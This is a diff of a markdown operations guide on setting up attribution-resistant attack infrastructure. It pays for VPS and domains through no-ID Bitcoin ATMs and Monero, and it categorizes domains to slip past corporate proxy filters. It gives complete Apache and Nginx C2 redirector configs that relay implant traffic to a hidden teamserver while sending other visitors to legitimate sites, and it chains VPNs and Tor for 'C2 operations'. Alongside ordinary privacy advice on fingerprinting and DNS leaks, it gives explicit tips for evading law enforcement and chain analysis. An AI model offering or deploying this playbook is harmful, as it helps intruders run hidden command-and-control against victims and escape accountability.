+### Why Anonymous Infrastructure Matters
+
+Every time you connect to a server you don't control, you leave logs. Your IP address. Timestamps. HTTP headers. The services you ran. The files you touched. If that IP address links to your real identity (through your ISP, through a payment record, or through a registration email), you are identifiable.
+
+Anonymous infrastructure breaks that chain. The VPS logs exist. The domain registrar logs exist. But they trace to payment that traces to cryptocurrency that traces to a mixing chain that traces nowhere useful.
+
+---
+
+#### The Payment Chain
+
+```
+Cash
+  ↓
+Bitcoin ATM (below ID threshold)
+  ↓
+Bitcoin (pseudonymous: chain is traceable)
+  ↓
+Monero exchange via Bisq or Haveno (no KYC, decentralized)
+  ↓
+Monero (private: see Cryptocurrency section)
+  ↓
+VPS + Domain + Redirector infrastructure
+```
+
+Every step in this chain matters. Skipping any step weakens the whole chain.
+
+**Finding a cash Bitcoin ATM without ID requirement:**
+- CoinATMRadar: https://coinatmradar.com
+- Filter: "No ID required" (varies by ATM and local regulation)
+- Typical no-ID threshold: $250–$900 depending on jurisdiction
+- Go to an ATM that is not near your home or workplace
+- Do not take transit that logs your card to the ATM location
+
+---
+
+#### VPS Acquisition (Attribution-Resistant)
+
+**Never use these providers with anonymous payment or for sensitive operations:**
+AWS, GCP, Azure, DigitalOcean, Linode/Akamai, Vultr.
+
+Reason: all are US-based or have US infrastructure, all comply immediately with law enforcement requests, all require verified payment methods that link to real identities, and all have abuse teams that respond quickly to external reports.
+
+**Providers that accept Monero:**
+
+| Provider | Location | Accepts XMR | Notes |
+|---|---|---|---|
+| Njalla | Sweden | Yes | Privacy-focused, holds domain in their name, founded by Pirate Bay co-founder |
+| 1984 Hosting | Iceland | Yes | Strong Icelandic privacy laws, good MLAT friction |
+| Cockbox | Sweden | Yes | XMR accepted, limited resources |
+| BuyVM | BVI | Yes | Accepts XMR for some plans |
+| Privex | Trinidad & Tobago | Yes | Privacy-focused, accepts XMR |
+
+**Setup procedure:**
+```
+1. Purchase VPS with Monero only.
+   Never use a credit card, PayPal, bank transfer, or Bitcoin directly.
+   Monero breaks the on-chain tracing that Bitcoin is subject to.
+
+2. Use Tor Browser to access the provider and complete the purchase.
+   Do not use your real IP for the initial account creation.
+   First access sets the log pattern: make sure it is clean from the start.
+
+3. Connect to your VPS only through Tor or through an anonymously-purchased VPN.
+   Never connect from your home IP. Not once. Not even "just to check something."
+
+4. SSH key authentication only. No passwords.
+   Passwords are weaker and do not benefit from key-based authentication's
+   resistance to brute force and interception.
+
+   Generate keys on your research machine:
+   ssh-keygen -t ed25519 -C "ops_key"
+   (Ed25519 is preferred over RSA: smaller, faster, equally strong for this purpose)
+   Add public key to VPS authorized_keys.
+   Keep private key on an encrypted volume.
+
+5. Harden the VPS immediately after first login:
+   - Disable password authentication in sshd_config
+   - Change SSH port from 22 to something non-standard (reduces automated scan noise)
+   - Configure UFW or iptables to allow only necessary ports
+   - Set up unattended-upgrades for automatic security patches
+   - Disable root login (create a dedicated user)
+```
+
+**Basic VPS hardening script:**
+```bash
+#!/bin/bash
+# Run as root after first login
+
+# Create non-root user
+useradd -m -s /bin/bash operator
+mkdir -p /home/operator/.ssh
+cp ~/.ssh/authorized_keys /home/operator/.ssh/
+chown -R operator:operator /home/operator/.ssh
+chmod 700 /home/operator/.ssh
+chmod 600 /home/operator/.ssh/authorized_keys
+
+# Add to sudo
+usermod -aG sudo operator
+
+# Disable root SSH login, disable password auth
+sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+sed -i 's/^#Port 22/Port 2222/' /etc/ssh/sshd_config   # Change port
+
+# Install and configure UFW
+apt update && apt install -y ufw unattended-upgrades
+ufw default deny incoming
+ufw default allow outgoing
+ufw allow 2222/tcp comment 'SSH'
+ufw --force enable
+
+# Enable automatic security updates
+dpkg-reconfigure --priority=low unattended-upgrades
+
+systemctl restart sshd
+echo "Hardening complete"
+```
+
+---
+
+#### Domain Registration (Attribution-Resistant)
+
+```
+Option 1: Njalla (recommended)
+  - Njalla registers domains in their own name and resells access to you
+  - Your identity never appears in WHOIS records
+  - Accepts Monero
+  - https://njal.la/domains/
+
+Option 2: Epik
+  - Accepts crypto, provides WHOIS privacy
+  - Less privacy-focused than Njalla but more domain options
+  - https://www.epik.com
+
+Option 3: OpenSRS / Tucows through a privacy-focused reseller
+  - WHOIS privacy included
+  - Check whether the registrar resells data before using
+```
+
+**Domain selection strategy for C2:**
+
+```
+1. Aged domains perform better for C2 traffic blending.
+   An aged domain (1+ year of history) has:
+   - Existing DNS history that matches its claimed category
+   - Less suspicious traffic patterns (new domains are more scrutinized)
+   - Potentially cached categorization in corporate proxies
+
+2. Category-appropriate domains blend into corporate traffic.
+   Target categories: IT/Computers, Business/Finance, Technology, SaaS
+   Avoid: "Uncategorized" (triggers scrutiny), "Anonymizer/VPN" (blocked outright)
+
+3. Pre-purchase checks:
+   - Web Archive history: https://web.archive.org
+     (History should be consistent with your target category)
+   - Blocklist check: https://urlvoid.com
+     (Should not appear on any threat intelligence blocklists)
+   - DNS reputation: https://mxtoolbox.com/SuperTool.aspx
+     (MX, SPF, DKIM should be clean)
+
+4. Categorization requests (important for bypassing corporate proxy filters):
    - Bluecoat/Symantec: https://sitereview.bluecoat.com
    - Cisco Talos: https://talosintelligence.com/reputation
-   - Target category: IT/Computers, Business, Finance, not "uncategorized"
-```
-
-**Redirector Architecture:**
-```
-Implant → Redirector (VPS) → C2 Teamserver (VPS)
-
-Never expose teamserver directly. Redirectors are sacrificial.
-If a redirector gets burned, rotate it. Teamserver stays clean.
-
-Apache mod_rewrite redirector:
-RewriteEngine On
-RewriteCond %{REQUEST_URI} ^/update/.*$
-RewriteRule ^(.*)$ http://TEAMSERVER_IP%{REQUEST_URI} [P]
-RewriteRule ^(.*)$ https://LEGITIMATE_SITE.com/ [L,R=302]
-# anything that doesn't match your C2 path gets sent somewhere legit
-
-Nginx alternative:
-location ~* ^/(update|sync|api)/ {
-    proxy_pass http://TEAMSERVER_IP;
-    proxy_set_header X-Forwarded-For $remote_addr;
-}
-location / {
-    return 302 https://www.google.com/;
-}
+   - Fortinet: https://www.fortiguard.com/webfilter
+   Submit your domain for categorization before use. Targeting IT/Computers
+   or Business is your goal.
 ```
 
 ---
 
-#### **3. Anonymization Stack**
+#### Redirector Architecture
 
-**Time:** 3–5 days | **Difficulty:** Low-Medium | **Prerequisite:** Basic networking
+**Why redirectors exist:**
 
-**VPN Selection Criteria:**
+Your C2 teamserver is valuable infrastructure. If an analyst discovers your C2 server's real IP, they can block it, analyze your traffic, and potentially deanonymize you. A redirector is a sacrificial layer between your implant and your teamserver.
+
 ```
-- No-log policy AND audited (not just claimed): look for actual audits
-- Accepts anonymous payment (Monero, cash)
-- Jurisdiction: outside 5-Eyes, 9-Eyes, 14-Eyes if possible
-- WireGuard or OpenVPN (not proprietary protocols)
-- Kill switch: traffic must not leak if VPN drops
-
-Audited options (2026–2027):
-- Mullvad (Sweden, accepts cash/XMR, audited 2023+, RAM-only servers): https://mullvad.net
-  NOTE: Mullvad removed port forwarding in 2023 — factor into C2 design
-- ProtonVPN (Switzerland, open source, audited, Stealth protocol for deep packet inspection bypass): https://protonvpn.com
-- IVPN (Gibraltar, accepts XMR, minimal logging): https://www.ivpn.net
-- AirVPN (Italy, accepts XMR, port forwarding, Eddie client): https://airvpn.org
-
-NEVER use: HideMyAss, PureVPN, IPVanish, NordVPN (all have cooperation history or centralized logging).
-NOTE 2027: Mullvad and ProtonVPN both confirmed RAM-only infrastructure with physical audits — currently highest confidence options.
+[Implant on Target] ──→ [Redirector VPS] ──→ [Teamserver VPS]
+                                                       ↑
+                                              This IP is never exposed
+                                              to the target network
 ```
 
-**Tor Usage:**
+If the redirector gets burned (discovered, blocked, reported): rotate it. Spin up a new VPS, new domain. Teamserver stays clean.
+
+**Apache mod_rewrite redirector:**
+
 ```bash
-# Install Tor
+# Install Apache
+apt install -y apache2
+
+# Enable required modules
+a2enmod rewrite proxy proxy_http ssl headers
+
+# Create the redirector config
+cat > /etc/apache2/sites-available/redirector.conf << 'EOF'
+<VirtualHost *:443>
+    ServerName your-c2-domain.com
+    SSLEngine on
+    SSLCertificateFile /etc/letsencrypt/live/your-c2-domain.com/fullchain.pem
+    SSLCertificateKeyFile /etc/letsencrypt/live/your-c2-domain.com/privkey.pem
+
+    # Only proxy requests matching your C2 URI pattern
+    RewriteEngine On
+    RewriteCond %{REQUEST_URI} ^/api/v1/update.*$ [NC]
+    RewriteRule ^(.*)$ http://TEAMSERVER_IP%{REQUEST_URI} [P,L]
+
+    # Everything else: redirect to a legitimate-looking site
+    RewriteRule ^(.*)$ https://www.microsoft.com/ [L,R=302]
+    
+    # Strip identifying headers
+    RequestHeader unset X-Forwarded-For
+    Header always unset X-Powered-By
+</VirtualHost>
+EOF
+
+a2ensite redirector.conf
+systemctl reload apache2
+```
+
+**Nginx redirector alternative:**
+
+```nginx
+server {
+    listen 443 ssl;
+    server_name your-c2-domain.com;
+
+    ssl_certificate /etc/letsencrypt/live/your-c2-domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/your-c2-domain.com/privkey.pem;
+
+    # C2 traffic path: proxy to teamserver
+    location ~* ^/(api|sync|update)/ {
+        proxy_pass http://TEAMSERVER_IP;
+        proxy_set_header Host $host;
+        proxy_ssl_verify off;
+    }
+
+    # Everything else: redirect to legitimate site
+    location / {
+        return 302 https://www.google.com/;
+    }
+}
+```
+
+**Let's Encrypt certificate (free, automated):**
+
+```bash
+apt install -y certbot python3-certbot-apache
+certbot --apache -d your-c2-domain.com
+
+# Automatic renewal
+crontab -e
+# Add: 0 12 * * * certbot renew --quiet
+```
+
+---
+
+#### Infrastructure Hygiene Rules
+
+```
+1. One operation, one VPS, one domain.
+   Never reuse infrastructure across operations.
+   If it gets burned in one operation, it doesn't contaminate another.
+
+2. Keep a log of all infrastructure you've stood up and when you tore it down.
+   (Encrypted, locally stored, not in the cloud.)
+
+3. Tear down infrastructure after operations.
+   Do not leave live infrastructure running with no active purpose.
+   It accumulates log data and provides a potential pivot point if discovered.
+
+4. Never access your teamserver directly. Always through a redirector or jump box.
+
+5. Document your own infrastructure so you can identify it if you see it in logs.
+   Know your own IP ranges. Know your own domains. Know your own certificates.
+```
+
+---
+
+### ANONYMIZATION STACK - VPN, TOR, AND CHAINING
+
+> **Understanding what each layer protects, what each layer does not protect, and how to chain them correctly is the difference between real anonymization and false confidence.**
+
+---
+
+#### Layer 1 - VPN
+
+**What a VPN does:**
+- Encrypts traffic between you and the VPN server
+- Hides your traffic from your ISP (they see encrypted VPN traffic, not your activity)
+- Hides your real IP from the destinations you visit (they see the VPN's IP)
+- May hide your activity from network observers on your local network (public WiFi)
+
+**What a VPN does NOT do:**
+- Make you anonymous: the VPN provider knows your real IP
+- Protect against a malicious VPN provider logging everything
+- Stop metadata analysis (traffic timing, volume, patterns)
+- Stop the VPN provider from complying with legal requests
+
+**The key question: do you trust the VPN provider more than you trust your ISP?**
+
+For most contexts, yes: a privacy-focused VPN in a good jurisdiction is more private than your home ISP. But the VPN provider is still in the chain.
+
+**VPN Selection Criteria (2026–2027):**
+
+| Requirement | Why It Matters |
+|---|---|
+| No-log policy AND independently audited | "We don't log" is marketing. Audited logs absence is evidence. |
+| Accepts Monero/cash payment | Payment records link identity to account |
+| Outside 5-Eyes/9-Eyes/14-Eyes jurisdiction | Reduces automatic intelligence sharing |
+| WireGuard or OpenVPN (open source protocols) | Proprietary protocols can be backdoored |
+| Kill switch | If VPN drops, traffic must not leak your real IP |
+| RAM-only servers | No persistent storage means no logs survive a seizure |
+
+**Current recommendations (2026–2027):**
+
+| Provider | Jurisdiction | XMR | Audit | Kill Switch | Notes |
+|---|---|---|---|---|---|
+| Mullvad | Sweden | ✓ | Multiple, public | ✓ | RAM-only. Removed port forwarding 2023; plan C2 design around this. |
+| ProtonVPN | Switzerland | ✗ (Bitcoin/cards) | ✓ | ✓ | Open source. Stealth protocol for DPI bypass. |
+| IVPN | Gibraltar | ✓ | ✓ | ✓ | Minimal account data (account number only, no email required) |
+| AirVPN | Italy | ✓ | ✓ | ✓ | Port forwarding available. Eddie client. |
+
+**Never use:** HideMyAss (turned over user data to FBI), PureVPN (logged and cooperated with FBI despite "no-log" claims), IPVanish (same), NordVPN (has been subpoenaed and claims no logs, but centralized infrastructure invites pressure).
+
+---
+
+#### Layer 2 - Tor
+
+**What Tor does:**
+- Routes your traffic through at least three hops (entry guard, middle relay, exit node)
+- Encrypts traffic in layers (like an onion; each hop decrypts one layer)
+- Hides your IP from the destination (they see the exit node's IP)
+- Hides your destination from the entry guard (guard knows your IP but not where you're going)
+- Hides your IP from the middle relay (it knows neither source nor destination)
+
+**What Tor does NOT do:**
+- Protect against a global passive adversary who can watch both ends of the connection simultaneously (timing correlation attacks)
+- Protect against de-anonymization through the content of your traffic (logged-in accounts, personal information in requests)
+- Protect against malicious exit nodes (they can see unencrypted traffic to HTTP destinations)
+- Make you fast (latency is real and unavoidable; three hops take time)
+
+**Installation and setup:**
+```bash
+# Debian/Ubuntu
 apt install tor
 
-# Proxychains for tool routing through Tor
-apt install proxychains4
-# Edit /etc/proxychains4.conf:
-# socks5  127.0.0.1 9050
-
-# Route tools:
-proxychains4 nmap -sT -Pn target
-
-# Tor Browser for browsing: don't customize it (fingerprint)
-# Download: https://www.torproject.org
-
-# CRITICAL WARNINGS:
-# - Don't resize Tor Browser window (fingerprints screen resolution)
-# - Don't log into personal accounts over Tor
-# - Don't enable JavaScript on high-security sites
-# - Timing correlation attacks are real at Tor exit nodes
-# - Tor is not sufficient alone for high-risk ops: chain with VPN
-```
-
-**The Tor + proxychains concept**
-
-> Install Tor (Kali/Ubuntu[VPS])
-
-```
-sudo apt update
-sudo apt install tor proxychains4 -y
-sudo systemctl start tor
-sudo systemctl enable tor
-```
-
-> By default, Tor runs a SOCKS5 proxy on `127.0.0.1:9050`. Check it:
-
-```
+# Tor runs a SOCKS5 proxy on 127.0.0.1:9050 by default
+# Verify it's running:
 ss -tlnp | grep 9050
-```
+# Expected output: 127.0.0.1:9050 LISTEN
 
-> proxychains config
+# Install proxychains4 for routing tools through Tor
+apt install proxychains4
 
-File: `/etc/proxychains4.conf`
-
-Make sure the last line contains:
-
-```
-socks5  127.0.0.1  9050
-```
-
-And keep `strict_chain` (default) at the top.
-
-> Test
-
-```
-proxychains4 curl https://check.torproject.org
-```
-
-If it says "Congratulations, you are using Tor", it's working.
-
-> Check traffic
-
-```
-proxychains4 curl ifconfig.me
-```
-
-It will show a Tor exit node IP, not your real IP.
-
-
-**Chain Architecture:**
-```
-For research: VPN → Tor → target
-For C2 operations: Tor → (VPN purchased over Tor) → target
-For maximum compartmentalization:
-  Personal network → VPN#1 → VPS (jump box) → VPN#2 → Tor → target
-
-Cost: latency. Accept it.
-
-proxychains config for chained proxies:
+# Configure /etc/proxychains4.conf
+# Ensure these settings:
+strict_chain           # fail if any proxy in chain fails
+proxy_dns              # CRITICAL: prevents DNS leaks outside Tor
+# At the bottom:
 [ProxyList]
-socks5  127.0.0.1 9050   # Tor
-socks5  10.0.0.1  1080   # SOCKS proxy on jump box
+socks5  127.0.0.1  9050
+
+# Test: route curl through Tor
+proxychains4 curl https://check.torproject.org | grep -i "congratulations"
+# Should confirm you're using Tor
+
+# Test: verify exit IP is Tor exit node
+proxychains4 curl ifconfig.me
+# Should show a Tor exit node IP, not your real IP
 ```
 
----
-
-#### **4. Identity Compartmentalization**
-
-**Time:** 2–3 days | **Difficulty:** Low | **Prerequisite:** None
-
-**The Cardinal Rule:** One identity per purpose. Never mix.
-
+**Tor Browser (for web browsing):**
 ```
-Identity Matrix:
-┌─────────────────┬───────────────────────────────────────────┐
-│ Personal        │ Real name, real accounts, real hardware   │
-│                 │ Never touches security research           │
-├─────────────────┼───────────────────────────────────────────┤
-│ Research        │ Pseudonym, throwaway email, research VMs  │
-│                 │ CTFs, GitHub security repos, forums       │
-├─────────────────┼───────────────────────────────────────────┤
-│ Operational     │ Fresh infrastructure each operation       │
-│                 │ No reuse of IPs, domains, usernames       │
-└─────────────────┴───────────────────────────────────────────┘
+Download only from: https://www.torproject.org
+Verify the signature before opening.
 
-What burns operators:
-- Reusing usernames across contexts
-- Using personal email for research account recovery
-- Logging into personal accounts from research IP
-- File metadata (Word docs embed author, timestamps)
-- EXIF data in uploaded images
-- Browser fingerprint consistency across identities
-- Same writing style / grammar patterns (stylometry)
+CRITICAL rules:
+- Do NOT resize the browser window
+  (your viewport size is a fingerprint: keep it at default)
+- Do NOT enable JavaScript on "Safest" security level
+  (JavaScript enables many fingerprinting techniques)
+- Do NOT log into personal accounts
+  (destroys anonymity immediately regardless of Tor)
+- Do NOT download and open documents
+  (PDFs, Word docs can beacon your real IP when opened)
+- Do NOT install extensions
+  (extensions change your fingerprint, making you unique)
+- Keep security level at Safest for sensitive browsing
 ```
 
-**Metadata Stripping:**
+**proxychains with specific tools:**
 ```bash
-# Images
-exiftool -all= image.jpg            # Strip all EXIF
-mat2 --inplace document.pdf         # Strip PDF metadata
+# Nmap through Tor (use -sT for TCP connect scan; SYN scans don't work through proxychains)
+proxychains4 nmap -sT -Pn -p 80,443,22 target.com
 
-# Documents
+# curl through Tor
+proxychains4 curl -I https://target.com
+
+# Python script through Tor
+proxychains4 python3 your_script.py
+
+# Git through Tor
+proxychains4 git clone https://github.com/example/repo
+
+# WARNING: Tor does not handle UDP. DNS goes through the proxy_dns directive.
+# Tools that use raw sockets or UDP may not work correctly.
+```
+
+---
+
+#### Layer 3 - Chaining
+
+Different threat models require different chain configurations:
+
+**For general research (low sensitivity):**
+```
+Your machine → VPN → Target
+```
+Hides from ISP. VPN provider knows your IP. Adequate for most research activity.
+
+**For anonymous research (medium sensitivity):**
+```
+Your machine → VPN → Tor → Target
+```
+VPN hides your Tor usage from your ISP (some ISPs flag or throttle Tor). Tor hides the destination from VPN. The VPN knows your IP but not your destination. The Tor exit node sees your destination but not your IP.
+
+**For C2 operations (higher sensitivity):**
+```
+Your machine → Tor → Anonymously-purchased VPN → Target
+```
+Buy a VPN with Monero over Tor. Connect to that VPN through Tor. Your real IP never touches the VPN, so even a cooperating VPN provider cannot provide it.
+
+**For maximum compartmentalization:**
+```
+Personal machine → VPN#1 (home) → Jump Box VPS → VPN#2 (anon) → Tor → Target
+```
+Multiple hops, multiple jurisdictions, multiple providers. Each layer adds friction and latency. Use this level only when the threat model justifies it.
+
+**Chain rule:** Traffic cost is latency. Accept it. Speed and anonymity trade off. Do not compromise the chain to save two seconds.
+
+---
+
+#### DNS Leak Prevention
+
+A DNS leak occurs when DNS queries are resolved outside your anonymization chain: your real IP makes the DNS lookup even though your traffic is going through Tor or a VPN. This exposes your destination even if the content is encrypted.
+
+```bash
+# Test for DNS leaks: https://dnsleaktest.com
+# Run this test after every change to your network configuration.
+# Standard test and Extended test.
+# If ANY result shows your ISP's DNS servers: you have a leak.
+
+# Fix in proxychains4.conf:
+proxy_dns      # This line must be present and uncommented
+
+# Fix at the system level (if using VPN without proxychains):
+# Your VPN should handle DNS automatically.
+# If using Mullvad: their client handles DNS leak prevention.
+# If using OpenVPN manually:
+# Add to your .ovpn config:
+# block-outside-dns    (Windows)
+# push "dhcp-option DNS 10.8.0.1"  (server-side)
+
+# Verify with dnsleak test after any configuration change.
+```
+
+---
+
+### BROWSER FINGERPRINTING - YOU ARE BEING IDENTIFIED
+
+> **Every browser leaves a fingerprint: a combination of characteristics that, taken together, can identify you across sessions even without cookies. Understanding this is essential for separating identities.**
+
+---
+
+#### What Browser Fingerprinting Is
+
+When your browser loads a page, it exposes dozens of parameters:
+- **User-Agent string:** browser, version, operating system
+- **Screen resolution and color depth**
+- **Viewport size** (the visible area of the browser window)
+- **Installed fonts**
+- **Browser plugins and extensions**
+- **Canvas fingerprint** (how your GPU renders a specific image, unique to hardware + driver combination)
+- **WebGL fingerprint** (similar: GPU-based, highly unique)
+- **AudioContext fingerprint** (how your audio subsystem processes a specific audio operation)
+- **Time zone**
+- **Language settings**
+- **Do Not Track header**
+- **Cookie settings**
+- **Media devices (cameras, microphones present)**
+- **Battery status API** (partially deprecated but still available in some browsers)
+- **WebRTC IP leak** (can expose your real IP even through a VPN, see below)
+
+**Test your own fingerprint:** https://coveryourtracks.eff.org
+
+Run this test from your current browser. It shows you how unique you are. Most browsers with default settings are **uniquely identifiable** on the internet, meaning your browser fingerprint alone is sufficient to identify you across sessions, sites, and even VPNs.
+
+---
+
+#### WebRTC IP Leak - Critical to Understand
+
+WebRTC is a browser API for real-time communications (video calls, voice chat). Its ICE (Interactive Connectivity Establishment) protocol queries your real local and public IP addresses and can bypass VPN tunnels.
+
+**Test immediately:** https://browserleaks.com/webrtc
+
+**If your real IP appears despite a VPN: you have a WebRTC leak.**
+
+**Fix:**
+```
+Firefox: about:config → search "media.peerconnection.enabled" → set to false
+Chrome: No easy setting: use an extension like "WebRTC Leak Prevent" (adds trust dependency)
+Tor Browser: WebRTC is disabled by default
+Mullvad Browser: WebRTC is disabled by default
+```
+
+---
+
+#### The Browser Fingerprinting Problem for Multiple Identities
+
+If you use the same browser profile for your personal identity and your research identity, a tracking pixel or analytics code on any site you visit can link both identities, even with different IPs, even through a VPN.
+
+The solution is **strict identity separation at the browser level** with different fingerprint profiles per identity.
+
+---
+
+#### Browser Options for OPSEC
+
+**Option 1: Tor Browser (best fingerprint anonymity)**
+
+Tor Browser actively resists fingerprinting. Every Tor Browser looks identical to every other Tor Browser. The default window size is standardized. Canvas and WebGL fingerprinting is blocked. Fonts are limited to a standard set.
+
+**Use when:** You need maximum fingerprint anonymity. You're browsing through Tor. You're researching sensitive topics.
+
+**Limitations:** Slow (Tor latency). JavaScript on Safest mode disables many sites. Cannot log into services without breaking anonymity.
+
+**Option 2: Mullvad Browser (best non-Tor fingerprinting)**
+
+Mullvad Browser is a browser developed jointly by Mullvad VPN and the Tor Project. It is based on Firefox ESR with Tor Browser's fingerprint-resistant patches applied, but designed to run without the Tor network (used with Mullvad VPN or any VPN).
+
+- All Mullvad Browser instances look identical to each other
+- Resists canvas, WebGL, and font fingerprinting
+- uBlock Origin included
+- Private browsing by default (no cross-session tracking)
+
+Download: https://mullvad.net/en/browser
+
+**Use when:** You need fingerprint-resistant browsing with normal speed (non-Tor VPN), or Tor is too slow for your current use case.
+
+**Option 3: Firefox with hardened settings (per-identity profiles)**
+
+For multiple identities, Firefox supports separate profiles with completely different settings.
+
+```bash
+# Create a new profile
+firefox --ProfileManager
+# Or from command line:
+firefox -createprofile "research_identity"
+firefox -P "research_identity" --no-remote
+
+# Each profile is completely separate:
+# - Different cookies, session storage
+# - Different browser history
+# - Different extensions
+# - Different settings (can configure different fingerprinting resistance)
+```
+
+**Firefox hardening (user.js configuration):**
+
+```javascript
+// File: ~/.mozilla/firefox/[profile_dir]/user.js
+// Paste this into a user.js file in your Firefox profile directory
+
+// Disable WebRTC
+user_pref("media.peerconnection.enabled", false);
+
+// Disable telemetry
+user_pref("toolkit.telemetry.unified", false);
+user_pref("toolkit.telemetry.enabled", false);
+user_pref("datareporting.policy.dataSubmissionEnabled", false);
+
+// Disable geolocation
+user_pref("geo.enabled", false);
+
+// Canvas fingerprinting resistance
+user_pref("privacy.resistFingerprinting", true);
+
+// Letterboxing (standardizes viewport size)
+user_pref("privacy.resistFingerprinting.letterboxing", true);
+
+// Disable WebGL (reduces fingerprinting surface, breaks some sites)
+user_pref("webgl.disabled", true);
+
+// Disable battery API
+user_pref("dom.battery.enabled", false);
+
+// DNS over HTTPS
+user_pref("network.trr.mode", 2);
+user_pref("network.trr.uri", "https://mozilla.cloudflare-dns.com/dns-query");
+
+// Disable third-party cookies
+user_pref("network.cookie.cookieBehavior", 1);
+
+// First-party isolation (partitions storage per domain; prevents cross-site tracking)
+user_pref("privacy.firstparty.isolate", true);
+
+// Clear cookies on close
+user_pref("privacy.sanitize.sanitizeOnShutdown", true);
+user_pref("privacy.clearOnShutdown.cookies", true);
+user_pref("privacy.clearOnShutdown.history", true);
+```
+
+A maintained, comprehensive user.js: https://github.com/arkenfox/user.js
+
+**Option 4: Separate browsers for separate identities**
+
+A simple, practical approach: Tor Browser for anonymous research. Mullvad Browser for less-anonymous but fingerprint-resistant activity. Firefox (standard profile) for day-to-day personal use. Never overlap.
+
+---
+
+#### Practical Fingerprinting Rules
+
+```
+1. Test your fingerprint: https://coveryourtracks.eff.org
+   Know your current exposure before you operate.
+
+2. Do NOT install extensions in your operational browser.
+   Every extension is a fingerprint element. An unusual extension combination
+   makes you unique. Tor Browser and Mullvad Browser ship with uBlock Origin -
+   that is the only extension you need. Install nothing else.
+
+3. Do NOT resize Tor Browser window.
+   The default window size is standardized. Resizing breaks that standardization
+   and makes your viewport unique.
+
+4. Disable WebRTC in every browser you use operationally.
+   Test the disable worked: https://browserleaks.com/webrtc
+
+5. Do NOT log into personal accounts from operational browser profiles.
+   A single logged-in account destroys all fingerprint-based anonymization.
+   The account login tells the site exactly who you are.
+
+6. Separate browser profiles for separate identities.
+   Each identity gets its own profile. Never cross-use.
+
+7. Clear cookies and storage after sensitive sessions.
+   Or use a browser that does this automatically (private mode, Tor Browser).
+```
+
+---
+
+### CRYPTOCURRENCY - WHY MONERO AND HOW IT ACTUALLY WORKS
+
+> **Bitcoin is not anonymous. It is pseudonymous. Every transaction is permanently recorded on a public blockchain. Understanding why Monero is different, at a fundamental level, is what allows you to use it correctly.**
+
+---
+
+#### Why Bitcoin Is Not Private
+
+Bitcoin's blockchain is a permanent, public ledger. Every transaction ever made is visible to anyone. This is by design; it's what makes Bitcoin trustworthy as a currency.
+
+When you send Bitcoin from address A to address B, that transaction is visible forever. Chain analysis firms (Chainalysis, CipherTrace, Elliptic, Crystal Blockchain) specialize in tracing Bitcoin transactions. Law enforcement uses these tools routinely.
+
+**How Bitcoin gets traced:**
+
+```
+1. KYC exchange entry point:
+   You buy Bitcoin on Coinbase, Binance, Kraken: they have your ID.
+   You send that Bitcoin to an anonymous address.
+   Chain analysis can trace the flow from your KYC wallet to subsequent wallets.
+
+2. Address reuse:
+   Using the same Bitcoin address twice links all transactions to that address.
+   Easy for chain analysis.
+
+3. Transaction graph analysis:
+   Even without KYC, chain analysis clusters addresses that transact together.
+   Multiple inputs to a transaction → likely controlled by the same wallet.
+
+4. Dust attacks:
+   Tiny amounts of Bitcoin sent to your address. If you ever spend that dust,
+   it gets included in a transaction that links it to your other addresses.
+
+5. Timing correlation:
+   The timing of when you receive Bitcoin and when you convert or spend it
+   narrows the identity field.
+```
+
+**The 2013 Silk Road Bitcoin tracing:** The FBI traced Bitcoin from Silk Road wallets through a chain of transactions, eventually to exchanges where users had KYC'd. Years after the transactions occurred. The blockchain is permanent: there is no statute of limitations on the public ledger.
+
+---
+
+#### Why Monero Is Private
+
+Monero is built on three privacy primitives that work together:
+
+**1. Ring Signatures - Hides Who Sent**
+
+When you send Monero, your transaction is signed not just by you but also by a ring of other past transactions (other people's transactions, selected randomly from the blockchain). An observer sees a set of possible senders: they cannot determine which one actually sent the funds.
+
+```
+Conceptually:
+Instead of "Alice signed this transaction" (Bitcoin)
+Monero says: "One of [Alice, Bob, Carol, Dave, Eve] signed this transaction"
+But it does not reveal which one.
+
+Current ring size: 16 (as of Monero's current protocol)
+An observer has 1-in-16 odds of correctly guessing the sender per transaction,
+and those odds do not improve over time.
+```
+
+**2. Stealth Addresses - Hides Who Received**
+
+For every transaction you receive, Monero generates a one-time address that is used only for that transaction. An observer looking at the blockchain cannot link multiple payments to the same recipient: each payment appears to go to a different, unrelated address.
+
+Your actual wallet address appears nowhere on the blockchain. Only one-time addresses do.
+
+**3. RingCT (Ring Confidential Transactions) - Hides the Amount**
+
+Monero conceals the amount of every transaction using cryptographic commitments (Pedersen commitments). An observer can verify that inputs equal outputs (no coins created out of nothing) without knowing what any of the amounts are.
+
+Result: on the Monero blockchain, you cannot determine who sent, who received, or how much. All three critical pieces of information are cryptographically hidden.
+
+---
+
+#### Monero Subaddresses - Per-Identity Payment Addresses
+
+Every Monero wallet generates subaddresses: derived payment addresses that all route to the same wallet but appear completely unlinked on the blockchain.
+
+**Why this matters for OPSEC:**
+
+```
+Your master Monero wallet
+├── Subaddress for VPS infrastructure payments
+├── Subaddress for domain registration payments
+├── Subaddress for VPN payments
+└── Subaddress for miscellaneous operational costs
+
+Each subaddress looks completely different on the blockchain.
+Paying for your VPS and paying for your VPN with the same wallet
+appears as unrelated transactions.
+```
+
+**In practice:**
+```
+Open Feather Wallet → Receive → Create new subaddress
+Name it (e.g., "infra_vps_njalla")
+Use that subaddress only for Njalla payments.
+Create a separate subaddress for each payment purpose.
+```
+
+---
+
+#### Chain Analysis: What They Actually Do
+
+Understanding your adversary's tools is essential.
+
+**Chainalysis, CipherTrace, Elliptic** are the major chain analysis firms. They provide tools to law enforcement and financial regulators. Their capabilities for Bitcoin:
+- Cluster addresses into wallets using heuristic analysis
+- Identify exchange deposit addresses (from data sharing agreements with exchanges)
+- Trace transaction flows across hundreds of hops
+- Connect on-chain activity to real identities through KYC exchange records
+
+**Their capabilities for Monero:** Very limited. Monero was specifically designed to defeat the analytical techniques that work on Bitcoin. As of 2026, there are no known effective tracing methods for Monero transactions (when used correctly).
+
+**Critical "when used correctly" caveat:**
+- If you acquire Monero on a KYC exchange, that KYC exchange links your identity to your Monero wallet at acquisition
+- If you send Monero to a service that requires ID, that service links your identity to that receipt
+- The privacy is at the blockchain level; if the entry or exit point is tracked, the blockchain privacy doesn't help
+
+**Acquire Monero without KYC:**
+```
+Option 1: Bisq (decentralized exchange, no KYC)
+  https://bisq.network
+  Trade directly with another person.
+  Requires Bitcoin as the trading pair.
